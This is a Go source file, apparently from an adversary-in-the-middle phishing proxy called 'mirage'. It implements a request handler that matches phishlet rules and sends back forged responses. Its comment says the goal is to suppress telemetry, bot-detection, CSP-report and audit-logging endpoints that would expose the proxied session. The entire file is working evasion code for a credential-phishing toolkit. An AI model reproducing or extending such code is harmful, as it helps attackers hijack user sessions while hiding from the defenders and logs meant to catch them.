package request

import (
	"io"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// InterceptHandler returns a fully custom HTTP response for matching requests,
// preventing them from ever reaching the real server. Use cases include
// swallowing telemetry/bot-detection endpoints, CSP violation reports, and
// audit-logging endpoints that would expose the proxied session.
type InterceptHandler struct{}

func (h *InterceptHandler) Name() string { return "InterceptHandler" }

func (h *InterceptHandler) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Phishlet == nil {
		return nil
	}
	for _, rule := range ctx.Phishlet.Intercepts {
		if !rule.Path.MatchString(req.URL.Path) {
			continue
		}
		if rule.BodySearch != nil {
			body, err := getRequestBody(ctx, req)
			if err != nil || !rule.BodySearch.Match(body) {
				continue
			}
		}
		if rule.ContentType != "" {
			ctx.ResponseWriter.Header().Set("Content-Type", rule.ContentType)
		}
		ctx.ResponseWriter.WriteHeader(rule.StatusCode)
		if rule.Body != "" {
			_, _ = io.WriteString(ctx.ResponseWriter, rule.Body)
		}
		return proxy.ErrShortCircuit
	}
	return nil
}

var _ proxy.RequestHandler = (*InterceptHandler)(nil)
